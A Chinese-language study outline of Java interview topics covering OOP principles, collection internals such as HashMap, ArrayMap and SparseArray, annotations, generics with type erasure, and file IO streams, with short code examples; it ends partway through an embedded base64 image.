#大纲

[TOC]



## java

### java 三大特性及理解

Java语言的三大特性即是：封装、继承、多态

首先是抽象，把事物抽象成一个类，其次才是封装，将事物拥有的属性和动作隐藏起来，只保留特定的方法与外界联系

(1)实现了专业的分工。(2)隐藏信息，实现细节

多态可以说是“一个接口，多种实现”或者说是父类的引用变量可以指向子类的实例，被引用对象的类型决定调用谁的方法，但这个方法必须在父类中定义



1.条件：Java实现多态有三个必要条件：继承、重写、向上转型。

​         继承：在多态中必须存在有继承关系的子类和父类。

​         重写：子类对父类中某些方法进行重新定义，在调用这些方法时就会调用子类的方法。

​         向上转型：在多态中需要将子类的引用赋给父类对象，只有这样该引用才能够具备技能调用父类的方法和子类的方法。

2.方法**基于继承实现的多态**，**基于接口实现的多态** **同一个类中进行方法重载**。

3.好处：

1..可替换性（substitutability）。多态对已存在代码具有可替换性。例如，多态对圆Circle类工作，对其他任何圆形几何体，如圆环，也同样工作。
2.可扩充性（extensibility）。多态对代码具有可扩充性。增加新的子类不影响已存在类的多态性、继承性，以及其他特性的运行和操作。实际上新加子类更容易获得多态功能。例如，在实现了圆锥、半圆锥以及半球体的多态基础上，很容易增添球体类的多态性。
3.接口性（interface-ability）。

**前期绑定**：final，static，private，构造方法，成员变量（包括静态及非静态）

**后期绑定（多态）**：除了前期绑定之外的其他方法属于后期绑定，运行时能判断对象的类型进行绑定。

决定方法是哪一个类的版本，这通过由虚拟机推断出这个对象的运行时类型来完成，一旦知道运行时类型，虚拟机就唤起继承机制，寻找方法的最终版本。这叫做动态绑定。

```
java中实现多态的机制是依靠父类或接口的引用指向子类。从而实现了一个对象多种形态的特性。其中父类的引用是在程序运行时动态的指向具体的实例，调用该引用的方法时，不是根据引用变量的类型中定义的方法来运行，而是根据具体的实例的方法。
```

### 集合及原理

可排序型，链表与数组，线程安全性

collection

​	**list**

​		**arrayList**   ：动态数组，超过增加50%容量，System.arraycopy()，默认10 ，add-					   >ensureCapacityInternal   

​		**linkedList**： 双向链表，set/get 使用了O(n/2),查找index是在前半段还是在后半段来进行查找的

​		**vector** ：支持线程的同步，即某一时刻只有一个线程能够写Vector，避免多线程同时写而引起的不一

​			- **stack**

​	**set**

​		**treeset**	保存大小顺序

​		**hashset** ：存放在HashMap的key中，value同意使用一个static final的object，

​				如果碰撞导致链表过长(大于等于`TREEIFY_THRESHOLD`)，就把链表转换成红黑树；

​			- **linkedHashSet** ：保存插入顺序·或者是访问顺序。

​	**queue**（设计线程并发）

​		Deque

​			**LinkedList**是一种queue  

​			arrayDeque 

​		**priorityQueue**	（堆，优先级）

​                LinkedBlockingDeque（并发堵塞）

​	**map**

​		**hashMap** ：HashMapEntry。底层是哈希表和链表来实现，容量16，负载因子0.75，超过会容量扩大2倍

​			hash计算：1.计算得到hashcode2.高16位右移与低16位异或3.n-1 & hash 得到下标

​			减少碰撞

​			resize实现：将n-1扩大为原来两倍后，也就是左边一位置为1，那么&之后结果是1则移动到元索引		+原大小 ，为0则不动

​			->**linkedHashMap**：控制访问顺序  访问后，插入后，删除后 

​								1.8以前是循环双向链表 +init   1.8之后去掉了循环

​		**treemap**  使用红黑树来实现 保存大小顺序

​		**hashTable** 加入线程同步

​		线程安全的都不允许为空，hashmap都可以为空，hashtablekey不能为空

​		**arraymap：**

​		ArrayMap利用两个数组，mHashes二分有序数组用来保存每一个key的hash值，mArrray大小为mHashes的2倍，依次保存key和value。

​		时间换取空间，因为少了一个指向下一层的指针。

​		三级：4    4-8     8-12  

​		put ： hashcode查找是否有，没有就新建一个，并插入；

​			   存在一个index的hashcode相同，并且index*2 对应key值与put的相同，则直接return该index并覆盖；

​			  存在index的hashcode相同但是对应的key不同，则在该hash值得上下各寻找key值相同的，如果找到则返回该index；

​			  虽然有hashcode相同的，但是没有key相同的，则在end处插入。

​		**SparseArray**  key为int，免去了解包装。

**删除：**

删除的时候看有没有被标记过（将值置为Deleted），如果没有，就进行标记；

GC时会将被标记为Deleted的元素删除掉。

**新增：**

1）当key已经存在key数组的时候，直接替换value数组中对应的值； 
2）当key不存在的时候： 

1. 获取key要插入的位置 i= ~i; 
2. 如果i在有效范围（不需要扩容），并且此位置i被标记为删除了，直接拿来复用就好 
3. 不然的话，如果mGarbage被设置了且mSize >= mKeys.length， 
  表示该执行gc算法了，执行之后，重新利用二分查找算法确定下key的新位置（因为index可能变了）。接下来，如果currentSize+1<=array.Length,直接就把array[index]指向element就好了；否则，扩容，生成新数组，把newArray[index]指向element,然后把array的值复制到newArray;

SparseArray有两个优点：1.避免了自动装箱（auto-boxing），2.数据结构不会依赖于外部对象映射。我们知道HashMap 采用一种所谓的“Hash 算法”来决定每个元素的存储位置，存放的都是数组元素的引用，通过每个对象的hash值来映射对象。而SparseArray则是用数组数据结构来保存映射，然后通过折半查找来找到对象。



### **SparseArray应用场景：**

 

虽说SparseArray性能比较好，但是由于其添加、查找、删除数据都需要先进行一次二分查找，所以在数据量大的情况下性能并不明显，将降低至少50%。

满足下面两个条件我们可以使用SparseArray代替HashMap：

- 数据量不大，最好在千级以内
- key必须为int类型，这中情况下的HashMap可以用SparseArray代替：



### **ArrayMap应用场景**

- 数据量不大，最好在千级以内
- 数据结构类型为Map类型



### 反射

-

### 注解

**元Annotation**

@documented

@inherited

定被它修饰的Annotation将具有继承性——如果某个类使用了@Xxx注解（定义该Annotation时使用了`@Inherited`修饰）修饰，则其子类将自动被@Xxx修饰。

**Retention** 保留时长

默认class   Source 只存在文件   Class文件编译后存在  runtime 在运行时可见

**@Target**

作用域上·

```
@Documented
@Target(ElementType.METHOD)
@Inherited
@Retention(RetentionPolicy.RUNTIME)
public @interface MyAnnotataion{
    String name();
    String website() default "hello";
    int revision() default 1;
}
```

运行时注解：

反射获取注解及注解信息

编译时注解·

```
@AutoService(Processor.class)
abstractProcessor 
init
getSupportedAnnotationTypes
getSupportedSourceVersion
process
```

### 泛型

 Java 泛型就是把一种语法糖，通过泛型使得在编译阶段完成一些类型转换的工作，避免在运行时强制类型转换而出现`ClassCastException`，即类型转换异常。

伪泛型，在编译阶段会擦除泛型，最后在编译后的字节码中是不存在泛型概念的·1

利于 Integer integer = pair.getValue();

编译器其实会翻译成两部

1.原始方法的调用，此时返回的是Object

2，将返回类型强制转换为Integer



- 不能泛型引用传递

- 不能是基本数据类型

- 用下面的方法是错误的

  **[java]** [view plain](http://blog.csdn.net/sunxianghuang/article/details/51982979#) [copy](http://blog.csdn.net/sunxianghuang/article/details/51982979#)

  1. if( arrayList instanceof ArrayList<String>)      

  java限定了这种类型查询的方式，？为通配符，也即**非限定符**。

  **[java]** [view plain](http://blog.csdn.net/sunxianghuang/article/details/51982979#) [copy](http://blog.csdn.net/sunxianghuang/article/details/51982979#)

  1. if( arrayList instanceof ArrayList<?>)      

- 泛型类中的静态方法和静态变量不可以使用**泛型类所声明的泛型类型参数**

**1. Java中的泛型是什么 ? 使用泛型的好处是什么?**
泛型是一种参数化类型的机制。它可以使得代码适用于各种类型，从而编写更加通用的代码，例如集合框架。

泛型是一种编译时类型确认机制。它提供了编译期的**类型安全**，确保在泛型类型（通常为泛型集合）上只能使用正确类型的对象，避免了在运行时出现ClassCastException。

**\*2、Java的泛型是如何工作的 ? 什么是类型擦除 ?***
泛型的正常工作是依赖编译器在编译源码的时候，先进行类型检查，然后进行类型擦除并且在类型参数出现的地方插入强制转换的相关指令实现的。

编译器在编译时擦除了所有类型相关的信息，所以在运行时不存在任何类型相关的信息。例如List<String>在运行时仅用一个List类型来表示。为什么要进行擦除呢？这是为了避免**类型膨胀**。

**3. 什么是泛型中的限定通配符和非限定通配符 ?**
限定通配符对类型进行了限制。有两种限定通配符，一种是<? extends T>它通过确保类型必须是T的子类来设定类型的上界，另一种是<? super T>它通过确保类型必须是T的父类来设定类型的下界。泛型类型必须用限定内的类型来进行初始化，否则会导致编译错误。另一方面<?>表示了非限定通配符，因为<?>可以用任意类型来替代。

**4.编写一段泛型程序来实现LRU缓存?**

LinkedHashMap可以用来实现固定大小的LRU缓存，当LRU缓存已经满了的时候，它会把最老的键值对移出缓存。LinkedHashMap提供了一个称为removeEldestEntry()的方法，该方法会被put()和putAll()调用来删除最老的键值对。

**9. Array中可以用泛型吗?**
这可能是Java泛型面试题中最简单的一个了，当然前提是你要知道**Array事实上并不支持泛型**，这也是为什么Joshua Bloch在Effective Java一书中建议使用List来代替Array，因为List可以提供编译期的类型安全保证，而Array却不能。

**10. 如何阻止Java中的类型未检查的警告?**
如果你把泛型和原始类型混合起来使用，例如下列代码，Java 5的javac编译器会产生类型未检查的警告
，例如List<String> rawList = new ArrayList()
注意: Hello.java使用了未检查或称为不安全的操作;
这种警告可以使用@SuppressWarnings("unchecked")注解来屏蔽。

**11.你可以把List<String>传递给一个接受List<Object>参数的方法吗？**
不可以，没有继承关系，可以使用List<T>





泛型方法：  <T> 表明该方法中有T这个泛型，需要声明所有的泛型。

public <T> T showKeyName(Generic<T> container){
​        ...
​    }  

下面不是一个泛型方法：

 public T getKey(){
​            return key;
​        }



泛型通配符：

1.上边界限定通配符

`<? extends Fruit>`    

不能添加元素，因为里面都是子类，不知道究竟是哪个子类？

只能get，get出来的是T

2.下边界限定通配符

`<? super Fruit>`    

能添加元素，添加T或者T的子类，因为子类肯定是super T的子类。不能添加父类

能get，但是get出来的因为不知道父类是什么，所以只能是Object



类型擦除

这是因为不管为泛型的类型形参传入哪一种类型实参，对于Java来说，它们依然被当成同一类处理，在内存中也只占用一块内存空间。从Java泛型这一概念提出的目的来看，其只是作用于代码编译阶段，在编译过程中，对于正确检验泛型结果后，会将泛型的相关信息擦出，也就是说，成功编译过后的class文件中是不包含任何泛型信息的。泛型信息不会进入到运行时阶段。

**在静态方法、静态初始化块或者静态变量的声明和初始化中不允许使用类型形参。由于系统中并不会真正生成泛型类，所以instanceof运算符后不能使用泛型类。**



为了获得指定 Field 的泛型类型，应先使用如下方法来获取指定 Field 的类型。

Map<String, Integer> 

```
// 获得 Field 实例的泛型类型
Type type = f.getGenericType();
 // 强制类型转换
            ParameterizedType pType = (ParameterizedType)gType;
            // 获取原始类型
            Type rType = pType.getRawType();
            System.out.println("原始类型是：" + rType);
            // 取得泛型类型的泛型参数
            Type[] tArgs = pType.getActualTypeArguments();
            System.out.println("泛型类型是:");
            for (int i = 0; i < tArgs.length; i++) 
            {
                System.out.println("第" + i + "个泛型类型是：" + tArgs[i]);
            }
```

### IO与NIO

File

其中包含了一个重要的接口FileNameFilter，该接口是个文件过滤器，包含了一个`accept(File dir,String name)`方法，该方法依次对指定File的所有子目录或者文件进行迭代，按照指定条件，进行过滤，过滤出满足条件的所有文件。

```
        // 文件过滤
        File[] files = file.listFiles(new FilenameFilter() {
            @Override
            public boolean accept(File file, String filename) {
                return filename.endsWith(".mp3");
            }
        });
```

**RandomAccessFile**

，**所以如果需要访问文件的部分内容，而不是把文件从头读到尾，使用RandomAccessFile将是更好的选择。**

**"r":** 以只读方式打开。调用结果对象的任何 write 方法都将导致抛出 IOException。
**"rw":** 打开以便读取和写入。
**"rws":** 打开以便读取和写入。相对于 "rw"，"rws" 还要求对“文件的内容”或“元数据”的每个更新都同步写入到基础存储设备。
**"rwd" :** 打开以便读取和写入，相对于 "rw"，"rwd" 还要求对“文件的内容”的每个更新都同步写入到基础存储设备。

long getFilePointer( )：返回文件记录指针的当前位置
void seek(long pos )：将文件指针定位到pos位置



IO流

- （1）读写单位不同：字节流以字节（8bit）为单位，字符流以字符为单位，根据码表映射字符，一次可能读多个字节。

（2）处理对象不同：字节流能处理所有类型的数据（如图片、avi等），而字符流只能处理字符类型的数据。

- 按照流的角色来分，可以分为节点流和处理流。

可以从/向一个特定的IO设备（如磁盘、网络）读/写数据的流，称为节点流，节点流也被成为低级流。
处理流是对一个已存在的流进行连接或封装，通过封装后的流来实现数据读/写功能，处理流也被称为高级流。

```
//节点流，直接传入的参数是IO设备
FileInputStream fis = new FileInputStream("test.txt");
//处理流，直接传入的参数是流对象
BufferedInputStream bis = new BufferedInputStream(fis);
```

![img](https://camo.githubusercontent.com/fdb7d34b4c62c0dde7adca91c766e224ee3e11f3/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d333863336561343536326436646265332e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

，那么如果in的真实类型是 PushbackInputStream的话，只要客户端不需要使用unread()方法，那么客户端一般没有问题。但是如果客户端必须使用这个方法，就 必须进行向下类型转换。将in的类型转换成为PushbackInputStream之后才可能调用这个方法。但是，这个类型转换意味着客户端必须知道它 拿到的引用是指向一个类型为PushbackInputStream的对象。这就破坏了使用装饰模式的原始用意。

增加额外方法就会变成半透明装饰模式

![img](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAvgAAADhCAIAAAAyBlbOAAAgAElEQVR4nO2d/VMUV77/55+Isa5UQRWMyZZPu8K3NgMD6aoVYjQoLKDmbi4PA/iAD4CD7ooPIAiKgkTAREU0gCYRFTVeHo26IuCNItGwgohGcxdBSNwoRHfNgv394RPOPemeHgemh2Fm3q/6VKr79Dmnz0DnzMvPOTNoRAAAAAAAJ0Vj7wEAAAAAANgKiA4AAAAAnBaIDgAAAACcFogOAAAAAJwWiA4AAAAAnBaIDgAAAACcFogOAAAAAJwWiA4AAAAAnBaIDgAAAACcFogOAAAAAJwWiA4AAAAAnBaIDgAAAACcFogOAAAAAJwWiA4AAAAAnBaIDgAAAACcFogOAAAAAJwWiA4AAAAAnBaIDgAAAACcFogOAAAAAJwWiA4AAAAAnBaIDgAAAACcFogOAAAAAJwWiA4AAAAAnBaIDgAAAACcFogOAAAAAJwWiA4AAAAAnBaIDgAAAACcFoiOInFxcQJQg7i4OHv/MicQYe9H2vsX4iTgubIc/R/etfevy0nAU+eIQHQUEQTB3kNwEvCT5BEE4dPL9xDWB54ryxEE4TcLEhHWB546RwSiowgeaLXAT5IHogPRGX8gOhAdVwaio4ggCC+BGgiC0NPT09PT8/3339v7t2p/BEE42nAPYX3gubIcQRB+E7wGYX3gqXNEIDqKQHTUgk0NPT099v6t2h+Ijuqig+fqlUB0VBcdPHUOBERHEYiOWmBq4IHoQHTGH4gORMeVgegoAtFRC0wNPJaLzqJ4ozB/kZkKuUe/VCqPTk73CQh65S2M2/fvPXWFv6O8zhszfVZsymOne09d8QkI4ltJYlvxGZ+AIDY2yam85rbiM/wA5i+Jh+ioDkQHouPKQHQUUV10BgYGLly4oHQqoayszExbOdu2bXv48KH8VFKuxOnTp833bw2YGnjMi45x+37+XX+ym8f/va/LpEeYv4gVkhX5BARNdvOY7ObhExC0KN4o0YtF8cZtxWe2FZ8xbt9PPkG3WBRvpJjs5sEPgEJSuGJT3mQ3D7m4GLfvJx/aVnxmsptHSV0bsxn+lI/o5HTJpTdm+ph3O4jO2FBddAIiN0WlFoyzZOSXnQ2I3CQ/lZRb2Byi4zpAdBRRS3QGBgbo4Nq1axqNhvmE5FSCVqtNSUlhp2VlZRqN5tq1a0p30ev1sbGx/Ck11+v1hYWFL1++fKUnabXa27dvh4aGShzLejA18JgXnRWb8t6Y6UMasa34zBszfXjp4TMrRxvuldS1TXbzIDNgeRFSFiYZfJM3ZvrMXxJPWZPJbh57T11ZFG9ktyCn4fvfe+rKpj2fUv+b9nxKhT4BQUou8sZMnzdm+pDZ8Gkbdkqvjl3yCQgi31qxKa+krm3Tnk8lCrViU150cjpEx3rGIDr5ZWcTMg/wJeHJu9bnlR2qPH/91r0HD/sfPOz3jljHLkniRP2V9XllfEl+2dnw5F18byfqr/CVfxO85lzzTUkJH9dv3TtRf4U/PVR5ng4y9x3/TfAa8+51/da967fuvbt827nmm2O2NDx1jghERxG1ROfChQt6vf706dPXrl3TarWsXHJ6+vRpvgl/6eXLl6GhobzHUHP+VK/Xb9u2bWBgYNu2bWQtoaGhdJCSkhIbG0seozRINpjbt29rtVp1XQdTA48gCEca7pkJspCiU1cyi8+8MdPnSMO93KNfTnbzyCw+Y7Ly2u37N+75VJi/aP6SeJ+AoDdm+pD90KlPQNDBujaq/MZMH+qE9Uyiw3qb7ObBd06ZIepKo9EsijcWnboy2c2DbIna8s2LTl3xCQjKLD7DZ4no5bBTyjOx/t+Y6UNZKBoqJaKYkFGw8UsCz5XljEF0AiI3PXjYf6jyvHfEuhP1V84136R48LCfXERiRfllZ1mFQ5Xn88vOZu47nrnvOF3KLzv74GE/rynhybtYV0xZHjzsJz1iJRJTyS876x2xjnV4rvkmHRyqPH+i/sqDh/3vLt9mRt2u37r3m+A1mfuOP3jYP7bsDp46RwSio4ggCMMqUVhYqNVqr169qtVqt41gNBrZqV6v12q1HR0dVN9gMNAlg8FgMBjIe4xGI2tLFVj94eFhEp1t27ZdvXqVnfIH5qGx0bHRaCQzU+vlY2rgEQThyKW75mOym0fukXOZB06/McPnyKW7Pv5BmQdOv7IV1Z+/JE6YH/HGDJ+iymZJhTdm+FA/rOdF8UYqpJjs5iEZBrsvHQvzI+YvieM75E+PXLq7YmPeGzN8+H7k3fI1j1y6W1TZ/MYMn7XZ++mUH6f5wHNlOYIgvBm8erRRUnn+wcN+viS/7GzLrXvymrMjUugqVQhL3ukfuVFSp+XWvfyys+w0LHkn65xdevCwPyx5p7wyXy2/7KykjsnK8uAHf675Zsute/JBvjLw1DkiEB1FVBSd4eHhCxcukO50d3dTCe8WEiincvXq1ZCQEIPBoNfrjUbj8PAwqQxfs7u7OyQkJCQkRKPRaLVavV5vMBiMRqPBYDh9+vTVq1cNBkNhYWFhYSFrUlZWZjAYtv0a3roIvomVYGrgsUR0eB0pqmxmpz7+QVThYO03pCbC/Ai6St6Qe+QcZUFWbMyb7OYhzI/YuOco7yVkKmRCoxUd3kVYh4vijby40B1Nig4/fmq7YmOej3/Q/CVx5DpRSekS0VmxMc+M8eC5spyxic6bwavnLs9UcoWEzAPnmm/y5RQPHvafqG8WRTEh88ArRYflZpjolFSe50veDF7tH7mRckWiKD542N9y696J+uaSyvMn6psTMg+EJe88Ud+csa8iY18Fr2jUDx+UbeJLJCOE6DgrEB1FVBSdsrIykhXebHjRuXDhAl85JCSkrKysu7vbaDSePn1ar9fTJbnoMEhT2DGf/gkJCVEyKpODUR1MDTyCIJRfumsyIuKN85bERcQbKeYtiZvs5sFOKVL3HGWVI+KNk9083p4fMW9J3NQZPql7jmYcOE09RCWlJ2fvf3t+xGQ3j+Ub86jJ1Bk+GQdOl1+6m3Hg9NQZPtQJHVBMdvPgxzPZzYPq0/HUGT7J2fsj4o2swtQZPux06gwfulHGgdOT3TxS9xylq5JIzt5ffulucvb+qKR0qllc+01EvJGG9Pb8CPai6MDHP0jpx4XnynLGLDokDa90BRIdPqPDcjNmRIc504n65gcP+yNTCyjRsj6vLL/srMSxSINYD0yJ+IFZntEZc+Cpc0QgOoqoIjpPnz7V6/V6vb6jo4NkoqOjQ5JEoXWosrIyahISEtLR0UGy0tHRERISQpVJWeiU0jzsLhcuXNBoNGy9iSWECFqKMjNI0ixaXLP+JcvB1MBjRnQkwXTETJBMFFY2RyWlkxks35hHAjFvSZy8MhMdchoyJDOiw8SLSY+Pf9Db8yPkosMPm/p5e37E1Bk+hZXNvMlRJ7uOnONrSnqTH0B0rGS0opOxr4IlaSxxBSXRoW00bO+O0gLT+rwyEh2W6aE8TUnleVYnMrVAFMWWW/dIrWg3T1jyToqSyvPmJWbu8kx+sQyi41JAdBRRK6NTVlb29OnT4ZGsSUdHh16vZ1pDUIXh4eELFy4wWbl69SqVk+JIDnh3MRgMGo2GCZN50aEVMaPRSNpEzkTbgCSjUgtMDTxWig5Lz0jcheyBvGH5xjxyFElzSrpkHDhNFahk6gyfeUviKOSiQ/XJSOhGqXuOTnbzIH3hRYRPRJEeSTJSlF6a7OZBlgPRGU9GKzq0eSW/7CypRljyTtoZQz4RlrwzY1/Fifpmiei03Lo3d3lmy617kakFTHRYXudEfTOpDJkNS8bQTiBKz7TcuidZcqLdP9RcFEXK/ZAYmRGdjH0V55pvllSeZ5p1rvkmjWoM+3IgOo4OREcRdffoDA8PX7hwgbbakFVINusYDAa+Mp9fYVojPyAoaUSZHhIdydKVyYyOvBManupgauBREp2IeKOPfxBzjnlL4sgMJCVTZ/hEJaWbFB3qgY6Ts/ebFB1eQeQmYX7pih2zu5DH0HFx7Tes4a4j52gdat6SONKa4tpv+EU0iM44M7alK1KNN0eWmZhVkFjw2RFyFFIfSt6IomhyAUueaKG1KjqlG7FTPkik8svOnqhvJtGRLF2ZzOhI1stY3gii41JAdBRRS3R452AfsGIfkqISOuA/RWW56PCdUIler7969Spf2Wg0sqQRQyI6tFdalZcsAVMDj+pLV+QfhZXNfLLEpCVMneHDtIP2+kiaWCg6fAXeuspHck60yYZG5eMfVFjZPHWGj49/EH8vXnQyDpxme3ogOrZAFdGRXOJL6JRlX2ZHpMgzOvLI2FdBS1G0HYea09Zj2tGcX3aWthizRTFmLSRebBiUGWIDUBKdc803+UQURMdFgOgoIgjCkNrQvpyrV6+WlpYWFBQMDQ2VlpZqNBqj0SipSdWGhoaePHmSmZnp5+c3NDQkPxgaGgoJCRkaGvLz88vMzGxvb2crVvTRdDouKChg9Rl8J0NDQ3//+9+1Wu358+dVf9WYGngEQSj7611LgkRH6WrByWZK8Lw9P6LgZLO3f1DGgdNU7u0fNHWGj0aj2Vl+jm9yoOYb/jQ8zujtH8SXTHbzkJxSn5JjkxXK/np3+cY8b/8gGlV4nJHdhXI5Jl/gZDePyMT0eYvjyv56l7WaOsOH9j7TVaWfAJ4ryxEE4c33Vo028su+yC/74s33VoUl5bTcuiu5xJfkl33x4GH/ueYbLERRDEvKefCwPywph1Vbn1dKBxkfV1CdE/XNJZVfjmjNFw8e9pdUfkklDx72t9y6O3dZxpvvrTrXfOPN91a13LqbX/bF3GUZYUk5FCfqm0/UN9NxxscVkkGyJvwAHjzsH8OPggWeOkcEoqOIuqJz/vx5Pz8/rVabmZlJJbQ/JiQkxKRbkOhkZmaWlpbyfqPVaktLS41GI5U8efKE6jPROX/+PMmNVqsNCQkpKChg6sMqE9Rte3t7aWmpwWA4deoU7dphw1PrtWNq4LFcdCIT0yXmwVsOZU1ILya7eSRl7eeFxts/iLlFwclmeQ8bPjw62c2DTGhn+bmMA6eTsvbLRWfqDB9v/yBv/yCNRsOchm30YS5F1hWZmE73mjrDZ97iOPKeeYvj6IW8PT9CIl4bPjyq0WjoVZASsebhccaMA6eZLUF0rGRsokMaQaLDFISi5dZdiehIJIMURyI6rA7pC7tKOsJ3wgvK7HAjXzh3WUbkhj0kN2RXGR9XMPVhlfkmpEGkRA8e9rOeyZ8gOk4PREcRtUSHsikGg+Hvf/876cjQ0FB7ezvJCpXLW2m1Wj8/v9LS0qGhoczMTIPBMDSiJgUFBbwwEaxn/qZPnjzx8/OTixTL8ZAM0V2GRpI6dC95BmjMYGrgsVx0KBdi5ipvDN7+v/yVK3nIkyKkIEw7IhPTSWXMZ3RY/eUb8yhjpJRwomQMpZqoJClrPzWROBmzHElz84oD0RktoxWdyA17SBHIdSI37JE4AV2SiA6zDaY4EtGRZFMsFB2l9AylcGaHG1tu3Y3csEdSOSwph1JElC5iFRIy94uiuD6v1D8yVZ4Bgug4JRAdRdQSnfb2dnbsNwLzG2YblI+hak+ePKENxZIeWGpHkpsZ+rXolJaWspUvttP5/Pnz1IruSCXy0VJb+gCXKi9/CKLza0aV0aE1HcuDPiHFhzydEx5nNLmQNG9xnDzjwo4l/RScbDbjIhs+PMrbDC9YklsoOZzJLBREZ8yMVnRabt1lHkMLSeeab5CLSIIEiJSCLyeJoX6opKTyS1EUeVMhBaH+WSu2dGVedGgRijyJjIpsZna4ce6yDPKbksovec1iQSOhvBRExxWA6Chiiz06BoPBz89PksIpLS2Vp3ZMpnlYakcOic758+dpRYxvfvXqVbIrMpv29naTnTPa29vpq5Z5RbMGTA08losOAqKjFmNbumLhH5lKSz+0YsXiXPMNWipixsNLiX9k6txlGbz9ZHxcIa9D5hG5YQ+fJaISk6JD6aUT9c3UluVvaEjUSt5WEgmZ+1tu3R3Dfh08dY4IREcRW4iOlZgxj/b2dtqJrFRBngR65b1G20SJ8ZkaBgcHd+zYMTg4aLtbqAJEB6Iz/lgpOhMk5i7LoJ3IShUkG3ReGWa6gug4ExAdRSag6Dgo4zA1DA4Orlq1qrKyMikpaYK7DkQHosMYNzt3DtGZCOEET50LAtFRRBCEfwM1sPXU0Nvbu2zZshs3bjx9+vTGjRurVq16+vSpLW6kCoIglP61C2F9OPpbTm9vrzAv7O3otHGwc0EQ3py/CmF9OPpT55pAdBSB6KiFTaeG3t7eVatW3bp16+kIN27cWLly5YR1HYgOREcUxa6uLmFeWMDqfQEpRwMSCmxt5xAdiI4rA9FRBKKjFrabGrq6upYtW9bV1fX010xk17Gv6ITHrd1zsll+KilXiqSsfRs+PGJ3xXF00fnqq6+E+YsCkg8HpBz9JRIKbPrEQnQgOq4MREcRiI5a2Ghq6OrqWrVq1YMHD56aYsK6jn1Fh75JmT99d3EcHfxXYlrpX7vMe0x43NrX3Txyyuu9/YOWbcyF6IyBmpoaYeF/Bawt+z/Lsb3rQHQgOq4MREcRiI5a2GJq+Oqrr1avXt3b2zugzMR0HbuLTnjc2v01N8Pj1pK1ePsH0cG7i+Penh9BHqPUfOuBU6+7eZT+tSunvP51Nw/7uo4jvuUcPnz47fClASlHTEfCHhs9sRAdiI4rA9FRBKKjFqpPDV999dVf/vIX85YzYV1nIohOeNzarQdOsVP+wHww0Sn9a9e7i+OmzvBJytoH0bGQHTt2BLy/1t94xEwErLCJ60B0IDquDERHEYiOWqg7NdTU1PzlL3/54YcfXmk5RFNT08qVK4eHh62/tSoIgvDJX7vGOT482cz+ZNXrbh5TZ/gEzI94d3FcwPyIxKx96QdOBcyP+K/EtP9KTGNNlm7MDZgfERa3lo93F8e97ubBl/BNxjkc6C3nxYsX69evD4je4m8sf2UErPhQddeB6EB0XBmIjiKCIPwM1EDFqaGmpiYzM9Nyy+nt7U1ISLhy5crjx48niOsIgvDJxS57BWkKO353cRxTFm//oNfdPMw3T99/6pV1xi0c6C3n7eD3A2K2WmI5NnIdQRDemL8SYX040FMHGBAdRSA6aqHW1HD8+PHMzMxBi3n06BFZDt16griOHUXnL/lH6C9xJmbtI9FZmpqbvv8UBS1FmW9OrdL3n7K75TiW6HR1db0d/L5/Uom9XAeiA9FxZSA6ikB01EKVqeHw4cP5+fljthzmOio+IWNDEITDF7vsEgHzIjQaTcC8CFIc+m/a/lMUcxfHaWf4sMpp+095+wfNXRxHa14B8yK0M3z+nH+EWtnrJfDhWG85v7hO4kH/tWUWhoquA9GB6LgyEB1FIDpqYf3UUFRUtH//fust5+eff1b3IRkDdhQd7Qwf7QyfsLi1AfMiSHTm/nrpihcdFmFxa/ly7QyfuYvj7G45Dic6ol1dB6ID0XFlIDqKQHTUwsqpYceOHUeOHLHScn744YefJ4DliPYTHbIZEh2mLGn7TzGPCYtbO3dx3L7qm+ZF54PEtNfdPOxuOY4oOqIodnR02MV1IDoQHVcGoqMIREctxjw1vHjxIiMj4/Tp0z9xjC2X8+9//9tGz8losZfoePsHkdyExa3dXl7PVqwC5kUEzIug4w8S0+RJHYno5J9oft3N48/5RyA6Y8MurgPRgei4MhAdRSA6ajG2qeHFixebNm2qrq7+yWL6+vpM5nKGhoZs95yMFruIDsvTMNH5c/4Rkhv6zsAPEtOY+kiSOiQ628vrl6bmBsyLWJO1j3bt8P4E0RkVHR0dbwcv8U8s9l9bamEErMi3xnUgOhAdVwaio4ggCC+AGoxhahgcHFy/fv2lS5estJwJ8kkrHkEQDl24Y6/QzvD+Y+xadvrBmjTtDO+Pq25oZ3iv310uqbxlXyVVeN3NY7Y+MH7DLirPP970upuH/7wI6tBer8Wh33I6Ojrefm+Jfk2xPrnUwvBfPnbXEQThjXkJCOvDoZ86lwWiowhERy1GOzUMDg6uXr36ypUrzmc54kQSnfgNu15389iyr5Kchtxl/e7yj6tuUE1WIu+H2vrPi3jdzQOiMzZGXOeAPvkTC8N/+e6xuQ5EB6LjykB0FIHoqMWopobHjx+vXr36m2++cUrLESeG6KzfXT5bH+g/LyL/eBO7tGVfpXaGN0vtZJfV81flkV1WP1sfqNFossvqITpjY9xcB6ID0XFlIDqKQHTUwvKpobe3d/ny5W1tbc8spr+/X245//jHP16+fDk+z8losa/oZJfVZ5fVUxbHZFA6Z1QdjrYJRIdnfFwHogPRcWUgOopAdNTCwqnhu+++W7169bfffmul5fz4448T1nJEe4uOM4XTvOX84jqr9+uTDlsY/svyRuU6EB2IjisD0VEEoqMWlkwNXV1dy5cvt95ynjx5Mp4PyRiA6EB05NjadSA6EB1XBqKjCERHLV45Ndy6dWv16tX9/f1WWo66f/DZRkB0IDomsanrQHQgOq4MREcRQRD+BdTA/NTw1VdfrVmz5vvvv39uMd9//73ccgYGBsb/IRkDgiCUnL+DsD6c7y1nxHX26ZMOWRj+y3ItcR1BEKa+uwJhfTjfU+cKQHQUgeiohZmp4fLlyxs2bHjy5ImVljM4OGiXh2QMQHQgOmYg1/Fbtc8v8ZCFoV/6ateB6EB0XBmIjiIQHbVQmhpqampGaznPnz9PSEiIiIhI4Fi9enWSMjt27Dg8Gmpqar4eDb29vaN9ruyuCM4RzvqWYwvXgehAdFwZiI4iEB21MDk11NTUZGVljUpxiPv37//PaDhz5kzxaMjKylozGhYvXiyMErsrgnPE2+/+cbQ/eQfi7fcW+yWWWB76pbvMuI4A0YHouDAQHUUEiI5KyKeGw4cPZ2Vl/fPXjEF6HBEBoqNSCIIwKhVw+jDjOhAdiI4rA9FRBKKjFpKp4fDhw8XFxf90WCA6EyQgOpa7DkQHouPKQHQUgeioBT817Nixw6Etx3oEQahqaqtqajvTeMvuruDQIQiC35qDCEno4024DkQHouPKQHQUgeioBZsa0tLS